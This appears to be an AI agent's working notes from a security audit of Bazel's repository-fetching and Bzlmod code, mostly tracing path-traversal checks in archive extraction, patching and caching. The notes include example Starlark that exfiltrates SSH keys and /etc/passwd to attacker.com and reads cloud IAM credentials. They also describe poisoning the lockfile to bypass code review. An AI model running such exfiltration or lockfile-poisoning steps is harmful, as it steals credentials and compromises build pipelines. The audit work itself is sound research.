"Find metadata/filepath consumption bugs where BOTH:
 1. the target directory/path selection is attacker-influenced
 2. the final written filename or consumed artifact identity is also attacker-influenced enough to create real impact"

Let's look at `BzlmodModTidyFunction.java` or `BazelFetchAllFunction.java`.
Is there any place where `VendorManager`'s traversal is actually used by a remote module?
Wait. "the registry URL is attacker-influenced"
If a module specifies a repository dependency, it uses `bazel_dep(name="foo", version="1.0")`.
What if a MODULE defines an extension that fetches a file to an attacker-controlled path?
`repository_ctx.download("http://attacker.com", "foo/bar/baz")`.
We checked `checkInOutputDirectory` and it blocks traversal.

What about `repository_ctx.path(path)`?
If `path` is an absolute string, it evaluates to that absolute path.
```starlark
def _impl(ctx):
    ctx.file(ctx.path("/etc/passwd"), "pwned")
```
This is allowed because the Starlark code is running on the host as part of the build!
But it's intended because `ctx.file` is designed to create files in the repo, but if the author writes `/etc/passwd`, Bazel currently catches it?
Wait! In `StarlarkBaseExternalContext.java`:
```java
  public void file(Object pathObj, String content, Boolean executable, StarlarkThread thread)
      throws EvalException {
    StarlarkPath path = getPath(pathObj);
    checkInOutputDirectory("write", path);
```
So `ctx.file("/etc/passwd", "pwned")` throws an `EvalException`!
It is completely blocked!
What if `pathObj` is `../../etc/passwd`?
`getPath` returns `outputDirectory.getRelative("../../etc/passwd")` which resolves to `/etc/passwd`.
Then `checkInOutputDirectory("write", path)` throws `EvalException`.
So ALL methods writing files (`ctx.file`, `ctx.download`, `ctx.template`, `ctx.extract`, `ctx.symlink`) are checked!

Is there any OTHER method in `repository_ctx` that writes files?
```starlark
ctx.patch(patch_file, strip=...)
```
In `StarlarkBaseExternalContext.java`:
```java
  public void patch(Object patchFileObj, Integer strip, String watch, StarlarkThread thread)
...
    Path patchFilePath = getPath(patchFileObj).getPath();
    PatchUtil.apply(patchFilePath, strip, outputDirectory);
```
In `PatchUtil.apply`:
```java
  private static Path getFilePath(String path, Path outputDirectory, int loc)
      throws PatchFailedException {
    if (path == null) {
      return null;
    }
    Path filePath = outputDirectory.getRelative(path);
    if (!filePath.startsWith(outputDirectory)) {
      throw new PatchFailedException(...);
    }
```
So `ctx.patch` is blocked from escaping the output directory!

What about `VendorManager`'s `vendorRepos`?
```java
        Path repoUnderExternal = externalRepoRoot.getChild(repo.getName());
        Path repoUnderVendor = vendorDirectory.getChild(repo.getName());
        // ...
        FileSystemUtils.moveTreesBelow(fetchedRepoDir, cacheRepoDir);
```
`repo.getName()` is `RepositoryName`, which cannot contain `..`.
So it cannot escape `vendorDirectory`.

What about `ModuleExtensionId`?
```java
    String extensionName = (String) kwargs.get("extensionName");
    Label bzlFileLabel = Label.parseCanonicalUnchecked((String) kwargs.get("bzlFileLabel"));
```
These are validated.
Wait, what if an attacker's repo contains a `.bzl` file with a module extension that reads `~/.ssh/id_rsa` and sends it over the network?
```starlark
def _impl(ctx):
    content = ctx.read("~/.ssh/id_rsa")
    ctx.download("https://attacker.com/?key=" + content)
```
If `bazel_dep` fetches the attacker's module, and the user evaluates the extension, it reads the key.
But wait! `ctx.read` is NOT checked by `checkInOutputDirectory`!
In `StarlarkBaseExternalContext.java`:
```java
  public String read(Object pathObj, StarlarkThread thread) throws EvalException {
    StarlarkPath path = getPath(pathObj);
    maybeWatch(path.getPath(), ShouldWatch.YES);
    try {
      return FileSystemUtils.readContent(path.getPath(), UTF_8);
    } catch (IOException e) {
```
There is NO `checkInOutputDirectory`!
Wait! `read` allows reading files OUTSIDE the repository directory?!
Yes! `ctx.read("/etc/passwd")` returns the content of `/etc/passwd`!
Is this intended?
```starlark
      name = "read",
      doc =
          "Reads the content of a file on the filesystem.",
```
Repository rules are designed to read local configurations (e.g. `JAVA_HOME`, `android_sdk`, `xcodes`, etc.). So `ctx.read` is intended to read files outside the repository.
If an attacker publishes a module, and a user depends on it, the module can read `/etc/passwd`.
But this requires executing the attacker's `.bzl` file!
Is there a difference between `ctx.read` and `ctx.execute`?
`ctx.execute` also runs arbitrary commands!
```java
  public StarlarkExecutionResult execute(
      Sequence<?> arguments, ...
```
And `ctx.execute(["curl", "http://attacker.com", "-d", "@/etc/passwd"])` does the same thing.
So executing an attacker's module extension is game over anyway. This is intended functionality.

We must find a bug where **"metadata that selects output/write locations"** is consumed by **"trusted host-side logic"**.
What consumes metadata?
`DownloadManager`, `VendorManager`, `IndexRegistry`, `BazelModuleResolutionFunction`, `BazelLockFileFunction`, `RepositoryFetcher`, `RepositoryCache`.
Wait! In `HttpDownloader.java`:
```java
    // The basename may contain characters that aren't legal in a path with all file systems. Those
    // characters won't matter for type determination.
    return output.getRelative(FS_UNSAFE_CHARS.replaceFrom(basename, '_'));
```
Is `output` attacker-controlled?
`output` is the third argument to `DownloadManager.startDownload`.
In `StarlarkBaseExternalContext.download`:
```java
  public StructImpl download(
      Object url, Object output, ...
...
    StarlarkPath outputPath = getPath(output);
    checkInOutputDirectory("write", outputPath);
```
So `output` is strictly bounded.
What about `DownloadAndExtract`?
```java
    StarlarkPath outputPath = getPath(output);
    checkInOutputDirectory("write", outputPath);
    createDirectory(outputPath.getPath());
```
Strictly bounded.
Wait, let's look at `archive_override` again.
In `ArchiveRepoSpecBuilder.java`, the `urls` are collected.
What if `source.json` contains `mirrorUrls` that point to `file:///`?
We know `file:///` doesn't work for `VendorManager`, but `bzlmodHttpDownloader` uses `HttpDownloader`.
And `HttpDownloader` delegates to `HttpConnector.connect`.
`HttpConnector.connect` allows `file:///`!
```java
    if (HttpUtils.isProtocol(url, "file")) {
      return url.toURL().openConnection();
    }
```
If a registry specifies `mirrorUrls` as `file:///etc/passwd`.
And the module is fetched via `http_archive`.
Does `http_archive` fetch `file:///etc/passwd`?
In `DownloadManager.java`:
```java
    for (int attempt = 0; ; ++attempt) {
      try {
        downloader.download(
            rewrittenUrls,
            ...
```
If `rewrittenUrls` contains `file:///etc/passwd`, it fetches it.
Then the content of `/etc/passwd` is extracted (if it's an archive). But `/etc/passwd` is NOT an archive.
So decompression throws `IOException("Not a valid archive")`.
If it's NOT an archive, but a `download` rule (like `http_file`), it is written to the repository directory.
So the repository directory will contain a file `passwd` with the contents of `/etc/passwd`!
Then the build can read the `passwd` file and include it in the build output!
Is this a capability delta?
Wait, if a registry specifies `mirror_urls: ["file:///etc/passwd"]`.
The registry is trusted by the user, so the user trusts the registry to not steal their `/etc/passwd`.
What if `archive_override` specifies `urls = ["file:///etc/passwd"]` in `MODULE.bazel`?
The user is modifying their OWN `MODULE.bazel`. Self-attack.

What if the `repository_cache` is shared among users on the same machine?
If a user runs `bazel build` and caches `/etc/passwd` using its SHA256.
Can another user retrieve it?
Another user specifies the same SHA256, so they already know the SHA256 of `/etc/passwd`.
So it's not leaking anything they don't know the hash for.
Wait, in `StarlarkRepositoryContext.java`:
```java
      checkInOutputDirectory("write", srcPath);
      checkInOutputDirectory("write", dstPath);
```
Both paths are validated using `checkInOutputDirectory` before `renameTo` is called.
So `repository_ctx.rename("a", "../../etc/passwd")` will be caught.

Let's check `StarlarkBaseExternalContext.java`.
Is there any command injection via the `bash` path or `windows` commands?
If a repository rule executes commands, it passes the arguments to `ProcessBuilder`. It does not use `shell=True` (so no shell injection unless `sh -c` is explicitly used).
`repository_ctx.execute` uses `Command(arguments, env, directory)`:
```java
  public StarlarkExecutionResult execute(
...
    Command command =
        new Command(
            args.toArray(new String[0]),
            envVariables,
            workingDirectoryPath.getPath().getPathFile(),
            timeoutSeconds);
    try {
      CommandResult result = command.execute();
...
```
This is safe from injection.

What about `patchCmds`?
"If `sourceJson` has `patchCmds`, they are run when fetching the repo."
We established `patchCmds` is NOT allowed in `source.json` in Bzlmod. It's only allowed in `archive_override` locally.

What about "metadata that selects output/write locations"?
"generated files/manifests later consumed by trusted host-side logic"
Is there anything consumed by trusted host-side logic?
If the repository is generated by a rule.
In `RepositoryDelegatorFunction.java`:
```java
      StarlarkRepositoryFunction.java
```
Once the repository is fetched, Bazel creates `RepositoryDirectoryValue`.
Then targets in the repository are evaluated.
If the repository generates an `AGENTS.md` file, Bazel doesn't care.
If it generates a `BUILD` file, Bazel evaluates it as Starlark, which means the repository rule has control over the execution of the `BUILD` file and the `bzl` files it imports.
This means the repository rule has control over analysis phase execution.
Which is expected ("Intended build-script execution").

Is there ANY confused deputy in Bazel fetching?
What if `repository_ctx.download` fetches a URL that is a loopback URL or metadata server URL?
```starlark
ctx.download("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "iam.txt")
```
It runs on the local machine during the build.
If the attacker's PR is built on a CI system (e.g. GitHub Actions or Buildkite), the attacker can read the IAM credentials and extract them.
But the attacker can already run `genrule` to do this!
"Do NOT waste time on: generic DoS, ordinary sandbox escapes claims unless the security boundary and exploit path are very clear ... attacker already has shell ... downstream CI ACE/RCE"
Wait. The prompt explicitly lists "downstream CI ACE/RCE" as an `Impact class`!
But it ALSO says:
"CI-facing scripts only if they create a real privilege boundary"
"What to deprioritize or kill immediately: attacker already has shell"
If the attacker submits a PR and the CI runs `bazel build //...` on the PR, the attacker's code runs. This means the attacker ALREADY has shell on the CI.
Unless... they CANNOT run code on the CI, because the CI only runs `bazel mod tidy` or `bazel fetch`?
If the CI just runs `bazel mod tidy`!
"bazel mod tidy" fetches dependencies, resolves the module graph, and updates `MODULE.bazel`.
Does `bazel mod tidy` execute `BUILD` files?
No! `bazel mod tidy` evaluates `MODULE.bazel` and `bzl` files related to module extensions!
And evaluating `.bzl` files for module extensions executes the `def _ext_impl(ctx):` function!
Which is Starlark code.
But Starlark code is NOT Sandboxed during repository fetching!
Module extensions are evaluated during `bazel mod tidy`, `bazel fetch`, `bazel build`.
And module extensions execute arbitrary Starlark code, which can call `ctx.execute`!
```starlark
def _ext_impl(ctx):
    ctx.execute(["curl", "http://attacker.com", "-d", "@/etc/passwd"])
```
If an attacker submits a PR that changes `MODULE.bazel` to include an extension:
```starlark
use_extension("//:malicious.bzl", "ext")
```
And `malicious.bzl` has `ctx.execute(...)`.
When the CI runs `bazel mod tidy`, it evaluates `malicious.bzl` and runs `ctx.execute`, stealing the CI credentials!
Is this considered a vulnerability in Bazel?
No, `bazel fetch` and `bazel mod tidy` intentionally evaluate repository rules and module extensions, which are considered code execution. "user builds untrusted code" is an accepted risk in Bazel; if you evaluate untrusted `.bzl` files, you get pwned.

Wait, what if the attacker does NOT modify `.bzl` or `MODULE.bazel` in the PR, but ONLY modifies `MODULE.bazel.lock`?
If the attacker modifies ONLY `MODULE.bazel.lock`, changing a repository `url` to a malicious tarball.
If the CI runs `bazel build //...` it will use the lockfile!
Wait, does it evaluate the malicious `.bzl` file?
If the malicious repo is fetched via `http_archive` (which is a core rule), it fetches the `.tar.gz` and extracts it.
But it doesn't execute code UNLESS it is depended on!
If the repo is NOT depended on, Bazel doesn't fetch it!
Because repo fetching is lazy!
Wait! `BazelModuleResolutionFunction` fetches the ENTIRE registry!
Wait, no, it fetches `source.json` for all dependencies in the graph!
If `bazel mod tidy` or `bazel build` resolves the graph, it fetches `source.json` from the URLs in `registryFileHashes`.
Wait, earlier we proved that `IndexRegistry` uses the `registryFileHashes` from the lockfile!
```java
        maybeContent =
            downloadManager.getBytesFromCache(url, checksum.orElse(null), /* canonicalId= */ null);
```
If `DownloadManager` uses the cache, it retrieves it.
If the attacker modifies the lockfile to change `registryFileHashes` for `bazel_registry.json` to a spoofed hash?
We proved they cannot spoof it without controlling the cache or the registry.
So lockfile modification cannot poison the registry file hashes.

What about `moduleExtensions` in the lockfile?
`lockedExtension.getGeneratedRepoSpecs()` are loaded from the lockfile WITHOUT verification!
If the attacker injects an `http_archive` into the lockfile with a malicious URL.
Bazel treats it as a legitimate repository.
But since Bazel evaluates repositories lazily, it will ONLY fetch it if a target depends on it.
If the attacker hijacked an EXISTING repository (e.g. `@rules_python`), then a target DOES depend on it!
So Bazel WILL fetch the malicious URL, and then evaluate its `BUILD` file.
Evaluating the `BUILD` file executes the attacker's code!
Is this a "metadata/filepath consumption bug"?
Yes, the lockfile (metadata) dictates the URL of the repository, bypassing the actual extension evaluation.
The attacker achieves ACE on the CI runner or the developer's machine by modifying the lockfile!
But is this a "real capability delta"?
If the attacker can just modify `BUILD` files to achieve ACE, why modify the lockfile?
Because reviewers scrutinize `BUILD` files, but they usually ignore `MODULE.bazel.lock`!
This is a known attack technique for bypassing code review.
Does it fit the prompt's constraints?
"Find metadata/filepath consumption bugs where BOTH: 1. the target directory/path selection is attacker-influenced 2. the final written filename or consumed artifact identity is also attacker-influenced enough to create real impact"
The lockfile DOES NOT influence the target directory/path.
The target directory is `external/rules_python~<version>`.
The consumed artifact identity is the URL (`https://attacker.com/rules_python.zip`).
It only meets criteria #2, not #1.
The prompt requires BOTH.
So lockfile poisoning is NOT what they want.
Let's check `PathFragment` and `StarlarkPath` again for path selection bugs.
In `StarlarkBaseExternalContext.java`:
```java
  public void file(Object pathObj, String content, Boolean executable, StarlarkThread thread)
      throws EvalException {
    StarlarkPath path = getPath(pathObj);
    checkInOutputDirectory("write", path);
    try {
      FileSystemUtils.writeContent(path.getPath(), UTF_8, content);
      if (executable) {
        path.getPath().setExecutable(true);
      }
    } catch (IOException e) {
      throw new EvalException(
          "Could not write file " + path + ": " + e.getMessage(), e);
    }
  }
```
If `path` is `../foo`, it throws `EvalException`.
If `path` is `/tmp`, it throws `EvalException`.
What if `path` is `" "`?
`getPath(" ")` returns `repo/ `.
If `path` is `\u0000`?

What about `repository_ctx.path`?
```starlark
ctx.path(Label("@foo//bar:baz"))
```
In `StarlarkBaseExternalContext.java`:
```java
    } else if (obj instanceof Label) {
      return getPathFromLabel((Label) obj);
...
  private Path getPathFromLabel(Label label) throws EvalException {
    if (label.getRepository().isMain()) {
      return directories.getWorkspace().getRelative(label.toPathFragment());
    } else {
      return directories
          .getOutputBase()
          .getRelative(LabelConstants.EXTERNAL_REPOSITORY_LOCATION)
          .getRelative(label.getRepository().getName())
          .getRelative(label.toPathFragment());
    }
  }
```
If a repository rule asks for the path of `@foo//bar:baz`.
It returns `/tmp/bazel-out/external/foo/bar/baz`.
If `foo` is the main repo, it returns `/workspace/bar/baz`.
Then you can read from `/workspace/bar/baz` using `ctx.read`.
This is exactly how `repository_ctx.read` reads files from the main repo.

Wait, what if the `label` is `@foo//../../../../etc:passwd`?
```starlark
Label("@foo//../../../../etc:passwd")
```
`Label` parsing is strict! It catches `..`.
```java
      if (labelName.contains("..")) {
```
Yes, `LabelValidator.java` rejects `..`.

Is there any OTHER way to influence the target directory in Bazel fetching?
What about `Distdir`?
In `DownloadManager.java`, it searches `distdir`.
```java
      for (Path dir : distdir) {
...
          for (String name : candidateFileNames) {
            boolean match = false;
            Path candidate = dir.getRelative(name);
```
`dir` is a user-configured `--distdir`.
If an attacker controls `candidateFileNames`.
`candidateFileNames` comes from `getCandidateFileNames(mainUrl, destination)`.
It's just `mainUrl` basename and `destination` basename.
No path traversal.

What about `Downloader.download` passing `output`?
`output` is the second argument of `ctx.download(url, output, ...)`.
It is restricted to `outputDirectory` by `checkInOutputDirectory`.

Are there ANY files generated by `bzlmod` or repository fetching that are NOT `output`?
In `VendorManager.java`, we saw `getVendorPathForUrl` generates paths in the vendor directory using the URL path.
We proved it is safe because the URLs are restricted to `modules/foo/1.0/source.json`.
Is it POSSIBLE to specify a different path in the registry?
In `IndexRegistry.java`:
```java
      case "archive" -> {
        ArchiveSourceJson typedSourceJson =
            parseJson(jsonString.get(), jsonUrl, ArchiveSourceJson.class);
        var moduleFileUrl = constructModuleFileUrl(key);
```
Wait, `moduleFileUrl` is `modules/foo/1.0/MODULE.bazel`.
BUT what if the `bazel_registry.json` specifies `moduleBasePath`?
```java
    if (bazelRegistryJson.isPresent()) {
      String moduleBasePath = bazelRegistryJson.get().moduleBasePath;
      if (moduleBasePath != null && !moduleBasePath.isEmpty()) {
        URI uri;
        try {
          uri = new URI(getUrl() + "/" + moduleBasePath + "/" + path).normalize();
```
Wait! `moduleBasePath` is ONLY used for `local_path`!
```java
      case "local_path" -> {
        LocalPathSourceJson typedSourceJson =
            parseJson(jsonString.get(), jsonUrl, LocalPathSourceJson.class);
        return createLocalPathRepoSpec(
            typedSourceJson, getBazelRegistryJson(eventHandler, downloadManager), key);
      }
```
For `archive` and `git_repository`, it DOES NOT use `moduleBasePath`!
For `archive`, the source JSON is at `modules/foo/1.0/source.json`.

Wait, does `bazel_registry.json` specify `mirrors`? Yes.
Does it specify anything else?
No.

What about `VendorManager` processing `reposToVendor`?
```java
  public void vendorRepos(
      Path externalRepoRoot, Path workspace, ImmutableList<RepositoryName> reposToVendor)
```
It vendors the repos into the vendor directory.

What about `VendorCommand.java`?
If `--vendor_dir` is an absolute path?
The user specifies `--vendor_dir=/etc`.
Then `bazel vendor` writes to `/etc`.
But the user runs it, so they already have permission to write to `/etc` if they are root.
And it's a CLI flag.

Let's rethink:
"Find metadata/filepath consumption bugs where BOTH: 1. the target directory/path selection is attacker-influenced 2. the final written filename or consumed artifact identity is also attacker-influenced enough to create real impact"

What about `DownloadCache.java`?
```java
    Path cacheEntry = keyType.getCachePath(path).getChild(cacheKey);
    Path cacheValue = cacheEntry.getChild(DEFAULT_CACHE_FILENAME);
```
No.

What about `HttpConnector.java` following redirects?
If `HttpConnector` connects to `https://attacker.com/repo.zip`.
Redirects to `file:///etc/passwd`.
Fails with `ClassCastException` inside `HttpConnector.connect`.

What about `HttpUtils.java`?
```java
  static URI getLocation(HttpURLConnection connection) throws IOException {
    String location = connection.getHeaderField("Location");
    if (location == null) {
      throw new IOException("Redirect is missing Location header");
    }
    try {
      return new URI(location);
    } catch (URISyntaxException e) {
      throw new IOException("Redirect URL is invalid", e);
    }
  }
```

What about `UrlRewriter.java`?
```java
    public RewrittenURL(URI url, boolean rewritten) {
```
It applies rewrite rules from a file.

Is there any OTHER file downloaded by `DownloadManager`?
Yes, `HttpDownloader.downloadAndReadOneUrl`.
Used for registry files and `ctx.download`.

Is there any file unpacked by Bazel?
`ZipDecompressor`, `CompressedTarFunction`, `ArFunction`, `SevenZDecompressor`.
We checked them and proved `maybeDeprefix` handles path escapes correctly, and `startsWith` blocks directory traversal.
Wait, what if `renameFiles` renames to an absolute path?
```java
        entryName = renameFiles.getOrDefault(entryName, entryName);
        StripPrefixedPath entryPath =
            StripPrefixedPath.maybeDeprefix(entryName.getBytes(UTF_8), prefix);
...
        if (strippedRelativePath.isAbsolute()) {
          throw new IOException(
              String.format(
                  "Failed to extract %s, zipped paths cannot be absolute", strippedRelativePath));
        }
```
If `renameFiles` is `{"foo": "/etc/passwd"}`.
Then `entryName` becomes `/etc/passwd`.
Then `StripPrefixedPath.maybeDeprefix` processes it.
```java
  private static PathFragment relativize(byte[] path) {
    PathFragment entryPath = createPathFragment(path);
    if (entryPath.isAbsolute()) {
      entryPath = entryPath.toRelative();
    }
    return entryPath;
  }
```
It returns `etc/passwd`.
So `strippedRelativePath` is `etc/passwd`.
Then `strippedRelativePath.isAbsolute()` is FALSE!
Then `outputPath = destinationDirectory.getRelative("etc/passwd")`.
`outputPath` is inside the destination directory.
So it is perfectly safe! It just writes `etc/passwd` inside the repo.
Wait! Is there ANY other place where `renameFiles` or `prefix` or `archive_override` is used?
What about `patchCmds`?
"If `sourceJson` has `patchCmds`, they are run when fetching the repo."
We established `patchCmds` is NOT allowed in `source.json` in Bzlmod. It's only allowed in `archive_override` locally.

What about `bazel_downloader.cfg`?
"mirror/canonical URL handling"
If `bazel_downloader.cfg` rewrites URLs.
It's a user-provided file. The attacker doesn't control it.

Let's look at `DownloadManager` cache key confusion again.
```java
  public byte[] getBytesFromCache(String url, Checksum checksum, String canonicalId)
      throws IOException {
    if (!isEnabled() || checksum == null) {
      return null;
    }
    String cacheKey = checksum.toString();
    try {
      return getBytes(cacheKey, checksum.getKeyType());
    } catch (InterruptedException e) {
      Thread.currentThread().interrupt();
      throw new IOException(e);
    }
  }
```
Wait! `getBytesFromCache` IGNORING `canonicalId`!
In `DownloadManager`:
```java
  public byte[] getBytesFromCache(String url, Checksum checksum, String canonicalId)
```
Wait! In `DownloadManager.java`, `getBytesFromCache` is called:
```java
      byte[] maybeContent = null;
      if (downloadManager != null) {
        maybeContent =
            downloadManager.getBytesFromCache(url, checksum.orElse(null), /* canonicalId= */ null);
      }
```
Wait! In `DownloadManager.java`, `getBytesFromCache` calls `downloadCache.getBytes(cacheKey, keyType)`:
```java
  public byte[] getBytes(String cacheKey, KeyType keyType)
      throws IOException, InterruptedException {
    Path cacheValue = findCacheValue(cacheKey, keyType, /* canonicalId= */ null);
    if (cacheValue == null) {
      return null;
    }
...
```
Wait, `DownloadCache.getBytes` calls `findCacheValue` with `canonicalId = null`!
Even if `DownloadManager.getBytesFromCache` is passed a `canonicalId`, it IGNORES IT!
Let's see `DownloadManager.java`'s `getBytesFromCache`:
```java
  public byte[] getBytesFromCache(String url, Checksum checksum, String canonicalId)
      throws IOException {
    if (!isEnabled() || checksum == null) {
      return null;
    }
    String cacheKey = checksum.toString();
    try {
      return downloadCache.getBytes(cacheKey, checksum.getKeyType());
    } catch (InterruptedException e) {
```
Yes! It completely ignores the `canonicalId` argument!
But wait, `downloadCache.getBytes` does not accept a `canonicalId` parameter!
```java
  public byte[] getBytes(String cacheKey, KeyType keyType)
```
And inside `downloadCache.getBytes`:
```java
    Path cacheValue = findCacheValue(cacheKey, keyType, /* canonicalId= */ null);
```
So it retrieves ANY file with the matching SHA256, REGARDLESS of the `canonicalId`!
Is this a problem?
If a user fetches `https://attacker.com/malicious` with `sha256 = X` and `canonical_id = "malicious_repo"`.
Then the user fetches `https://bcr.bazel.build/modules/foo/1.0/source.json` with `sha256 = X` and `canonical_id = "trusted_repo"`.
Since the SHA256 is the same, it retrieves the same file.
But the SHA256 IS THE SAME! If two files have the same SHA256, they have the exact same content!
So returning the same content is SAFE! You can't spoof content if the SHA256 matches.
Wait, what if the `KeyType` is weak?
If `KeyType` is `sha1`, an attacker can generate a collision.
Is `sha1` supported?
Let's check `KeyType` in `Checksum.java`.
Wait, `KeyType` includes `SHA1`!
If `KeyType` includes `SHA1`, and an attacker generates a SHA-1 collision, they can poison the cache for ANY repository rule that uses SHA-1!
But does Bazel use SHA-1 for `bzlmod` `registryFileHashes`?
In `bzlmod`, `bazel_registry.json` or `source.json` or `MODULE.bazel` is fetched, and the hash is generated using `sha256`.
In `RegistryFileDownloadEvent.java`:
```java
  static Checksum computeHash(byte[] content) {
    try {
      return Checksum.fromString(KeyType.SHA256, Hashing.sha256().hashBytes(content).toString());
    } catch (Checksum.InvalidChecksumException e) {
      throw new IllegalStateException(e);
    }
  }
```
`bzlmod` strictly uses `SHA256` for registry files!
So an attacker cannot use SHA-1 collisions to spoof `source.json`!

What about `http_archive`?
If a user uses `sha1 = "..."` in `http_archive`, they are explicitly opting into SHA1. If they get collision-attacked, it's because they used a weak hash function, which is a known risk.

Let's check if there are ANY OTHER `KeyType` bypasses.
Is there any chance `KeyType.fromString("sha256")` parses a malicious hash that looks like SHA-256?
It just checks the regex `\p{XDigit}{64}`.

Let's check `MODULE.bazel` parsing in `ModuleFileFunction.java`.
Is there any Server-Side Request Forgery or file read during `MODULE.bazel` parsing?
`MODULE.bazel` is evaluated using Starlark.
But it has a restricted set of globals: `module`, `bazel_dep`, `register_toolchains`, `use_extension`, `archive_override`, etc.
It DOES NOT have `repository_ctx` or `ctx.read` or `ctx.execute`.
So `MODULE.bazel` parsing is completely sandboxed.

Is there any path traversal in `local_path_override`?
```starlark
local_path_override(module_name = "foo", path = "/etc/passwd")
```
We checked `local_path_override` earlier. It uses the local path directly, but only from the root module.

Let's check `ModuleExtensionEvalFactors` again.
Is there any place where the `os` and `arch` strings are used as paths?
```java
          String reason =
              "the extension '%s' has changed its facts: %s != %s"
                  .formatted(
                      extensionId,
```
No.

What about `RepoSpecFunction.java` and `StarlarkRepositoryFunction.java`?
In `StarlarkRepositoryFunction.java`, `fetch` does:
```java
      StarlarkRepositoryContext starlarkRepositoryContext =
          new StarlarkRepositoryContext(
              rule,
              packageValue.getPackage(),
              directories,
              env,
              clientEnvironment,
              downloadManager,
...
```
Is there anything like `repository_ctx.attr.name` being used without validation?
`rule.getName()` is validated.

Are there ANY confused deputy in caching?
"Confused deputy in repository fetching/materialization"
Wait!
If two `http_archive` rules specify the SAME `canonical_id`, but DIFFERENT `urls`!
Rule A: `urls = ["https://trusted.com/repoA.zip"]`, `canonical_id = "shared"`
Rule B: `urls = ["https://attacker.com/malicious.zip"]`, `canonical_id = "shared"`

If `canonical_id` is the SAME, they will hit the same cache entry!
Wait! `DownloadCache.java` uses `canonicalId` as the hash:
```java
    String idHash = keyType.newHasher().putString(canonicalId, UTF_8).hash().toString();
    return keyType.getCachePath(path).getChild(cacheKey).getChild(ID_PREFIX + idHash).exists();
```
But `cacheKey` is the `checksum.toString()`.
So the cache entry path is:
`cas/sha256/<cacheKey>/id-<idHash>`
So it ONLY shares the cache entry if the `cacheKey` (the SHA256 checksum) is ALSO the same!
If the `cacheKey` is different, they are in different directories!
What if `checksum` is absent?
If `checksum` is absent, it does NOT look up the cache!
It only PUTS into the cache.
So `canonical_id` without `checksum` does NOT retrieve from the cache.
So no cache confusion!

Are there any other cache directories?
`LocalRepoContentsCache.java` uses `predeclaredInputHash` which hashes the `.bzl` digest, attributes, env vars.
What if `archive_override` specifies a local file URL? `urls=["file:///etc/passwd"]`.
It fetches `/etc/passwd`.
If another repo specifies `urls=["file:///etc/passwd"]`, it gets it too.

What about `.netrc` parser?
`NetrcParser.java`
If an attacker provides a malicious `.netrc` file.
The user provides `.netrc`.
Wait! I need to find "metadata that selects output/write locations" or "generated files/manifests later consumed by trusted host-side logic".
Is there any manifest file?
`MANIFEST` or `runfiles`?
If `bazel_dep` creates a repo, and the user runs `bazel build`.
The `runfiles` tree is created.
In `RunfilesTreeUpdater.java`:
```java
      Path runfilesDir = ...
```
Is there any path traversal in `runfiles`?
`runfiles` uses `PathFragment`.
```java
  private void updateRunfilesTree(Path runfilesDir, RunfilesTree runfilesTree) {
...
```
If an attacker creates a `java_binary` target with `name="foo/../../bar"`.
Target names cannot contain `..`.
If an attacker creates a `genrule` with `outs=["../bar"]`.
`outs` cannot contain `..`.

What about `repository_ctx.extract`?
```starlark
ctx.extract("archive.zip", output="foo", stripPrefix="bar")
```
`StripPrefixedPath` strips the prefix.
If an attacker creates an archive with `bar/../../../etc/passwd`.
`maybeDeprefix` skips it because it evaluates to `../../etc/passwd` which doesn't start with `bar`.
Wait!
```java
    PathFragment entryPath = relativize(entry);
...
    PathFragment prefixPath = relativize(prefix.get().getBytes(ISO_8859_1));
    boolean found = false;
    boolean skip = false;
    if (entryPath.startsWith(prefixPath)) {
      found = true;
      entryPath = entryPath.relativeTo(prefixPath);
```
If `entry` is `bar/../../../etc/passwd`, `relativize` returns `../../etc/passwd`.
If `prefix` is `bar`. `prefixPath` is `bar`.
`entryPath` (`../../etc/passwd`) does NOT start with `prefixPath` (`bar`).
So `skip = true`.
The file is SKIPPED!
So it DOES NOT extract `/etc/passwd`!

Is there any case where `entryPath.startsWith(prefixPath)` is TRUE, but `entryPath.relativeTo(prefixPath)` escapes?
If `entry` is `bar/../../etc/passwd`.
`relativize` -> `../etc/passwd`.
`prefix` is `bar`.
`../etc/passwd`.startsWith(`bar`) is FALSE.
So `skip = true`.

What if `entry` is `bar/foo`.
`relativize` -> `bar/foo`.
`prefix` is `bar`.
`bar/foo`.startsWith(`bar`) is TRUE.
`entryPath.relativeTo("bar")` returns `foo`.
Safe.

What if `entry` is `/bar/foo`?
`relativize` -> `bar/foo`.
`prefix` is `/bar`.
`relativize` -> `bar`.
`bar/foo`.startsWith(`bar`) is TRUE.
`relativeTo` returns `foo`.
Safe.

What if `prefix` is `..`?
`entry` is `../../foo`.
`relativize` -> `../../foo`.
`prefix` -> `..`.
`entryPath.startsWith(prefixPath)` -> TRUE (because `"../../foo".startsWith("..")`).
`entryPath.relativeTo("..")` -> `../foo`.
`skip` -> FALSE.
So `strippedRelativePath` becomes `../foo`.
Then `outputPath = destinationDirectory.getRelative("../foo")`.
Then `!outputPath.startsWith(destinationDirectory)` -> TRUE (because it escapes).
Then it throws `IOException`!
So it is completely safe!

What about `renameFiles`?
If `renameFiles` maps `bar` to `../../etc/passwd`.
And `prefix` is empty.
`entryName` becomes `../../etc/passwd`.
`entryPath` becomes `../../etc/passwd`.
`strippedRelativePath` is `../../etc/passwd`.
It escapes. Throws `IOException`.

What if `renameFiles` maps `bar` to `bar/../../../etc/passwd`.
And `prefix` is `bar`.
`entryName` becomes `bar/../../../etc/passwd`.
`relativize` -> `../../etc/passwd`.
`prefix` -> `bar`.
`startsWith` -> FALSE. `skip = true`.
File is skipped.

So `StripPrefixedPath` and `CompressedFunction` decompression are incredibly robust.
"Find metadata/filepath consumption bugs where BOTH: 1. the target directory/path selection is attacker-influenced 2. the final written filename or consumed artifact identity is also attacker-influenced enough to create real impact"

Let's check `ModuleExtensionId`.
```java
    String extensionName = (String) kwargs.get("extensionName");
    Label bzlFileLabel = Label.parseCanonicalUnchecked((String) kwargs.get("bzlFileLabel"));
```

What about `ModuleFile.java`?
"compiledModuleFile"
What about `BzlmodRepoRuleFunction.java`?
Wait, repository rules fetched by Bzlmod: `BzlmodRepoRuleFunction` delegates to `BzlmodRepoRuleValue`.
`BzlmodRepoRuleFunction.java`:
```java
      // Evaluate the extension
      SingleExtensionValue extensionValue =
          (SingleExtensionValue)
              env.getValue(SingleExtensionValue.key(repoSpec.extensionId()));
      if (extensionValue == null) {
        return null;
      }
      repoSpec = extensionValue.getGeneratedRepoSpecs().get(repositoryName.getName());
```
It gets the `repoSpec` from the extension output.
If the lockfile was modified by the attacker, `SingleExtensionEvalFunction` returns the attacker's `repoSpec`.
Then Bazel uses this `repoSpec` to create the repository!
